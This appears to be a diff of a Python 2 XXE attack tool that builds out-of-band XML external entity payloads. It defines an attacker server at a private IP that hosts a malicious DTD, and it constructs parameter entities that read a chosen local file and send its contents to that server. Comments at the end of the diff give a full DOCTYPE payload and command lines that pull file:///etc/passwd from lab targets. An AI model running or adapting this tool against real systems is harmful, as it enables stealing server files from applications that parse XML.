@@ -5,7 +5,7 @@ import re
 class Request_maker:
 	def __init__(self):
 		self.dx=None
-		self.attackerserver="http://192.168.186.1:1337" # your fucking machine here! :D,location of dtd
+		self.attackerserver="http://192.168.67.1:1337" # your fucking machine here! :D,location of dtd
 		self.attackerserverDTD=self.attackerserver + "/xxe.dtd"
 
 	def HTTPrequest(self,url,method,add_header,post_data):
@@ -13,6 +13,7 @@ class Request_maker:
 		#code that support TRACE,PUT,DELETE.
 		#post_data=self.URLdecode(post_data,target,'adriantest')
 		#post_data=urllib.urlencode(post_data)
+		
 		request=urllib2.Request(url,post_data,add_header)
 		try: 
 			response=urllib2.urlopen(request)
@@ -32,7 +33,7 @@ class Request_maker:
 		except urllib2.HTTPError as e:
 			print e.reason
 			HTTPresponse={
-			'body' : e.reason,
+			'body' : e.read,
 			'response_header' : 'null',
 			'response_code' : 'null',
 			'info' : 'null',
@@ -79,14 +80,17 @@ class Request_maker:
 				print '/n xml or json type is called /n'
 				xmljsondata=parameters
 				target_node=target_param
-				target_file=target_parameter_value
+				xml_json_payload=target_parameter_value
 				#if content-type is json or xml call the XmlJsonIntruder function of request maker
 				#converts dictionary to json
-				post_data=self.XmlJsonIntruder(xmljsondata,target_node,target_file,content_type)
+				post_data=self.XmlJsonIntruder(xmljsondata,target_node,xml_json_payload,content_type)
 				#(self,XMLJsonData,target_node,target_file,content_type)
 
 
 
+		elif(parameters==None and parse.query==""):
+			print 'no post and get parameter, what is this ??'
+			post_data=''
 		else:
 			post_data=''
 		
@@ -156,7 +160,8 @@ class Request_maker:
 			#add some DTD changer here
 			#<tag> parameter value and attribute value!
 			print 'xml is your content_type'
-			self.XXEpayload(target_file)
+			XmlJson=target_file
+			print 'this is just nothing now!'
 
 
 
@@ -164,7 +169,7 @@ class Request_maker:
 
 
 			#
-		print "your payload\n" + XmlJson
+		
 
 
 		return XmlJson
@@ -185,8 +190,8 @@ class Request_maker:
 		#dtd="""<!ENTITY %payl SYSTEM "file:///c:/boot.ini">
 		#<!ENTITY %int "<!ENTITY &#37; trick SYSTEM 'http://evil?%payl;'>">
 		#"""
-		print '/n/n ERROR '
-		print target_file 
+		
+		print "file to retrive:_" + target_file 
 		dtd="""<!ENTITY % payl SYSTEM '""" + target_file + """'><!ENTITY % int "<!ENTITY &#37; trick SYSTEM '""" + self.attackerserver +"""?%payl;'>">
 		"""
 
@@ -231,3 +236,11 @@ class Request_maker:
 
 
 ##python xxe.py "http://192.168.186.136/login" --pdata "username=adrian&password=pass" XXE
+
+#http://192.168.186.1:1337/xxe.dtd'
+
+#<?xml version='1.0'?> <!DOCTYPE change-log[ <!ENTITY % remote SYSTEM 'http://192.168.67.1:1337/xxe.dtd'> %remote; %int; %trick; ]>
+
+#Invalid URI
+#python xxe.py "http://192.168.186.136/login" XXE --pdata "<xml>ddd</xml>" --content_type "xml" --target_file "file:///etc/passwd"
+#python xxe.py "http://127.0.0.1/multi/index.php?page=xml-validator.php&xml=%3Csomexml%3E%3Cmessage%3EHello+World%3C%2Fmessage%3E%3C%2Fsomexml%3E&xml-validator-php-submit-button=Validate+XML" XXE --target_file "file:///etc/passwd" --target xml
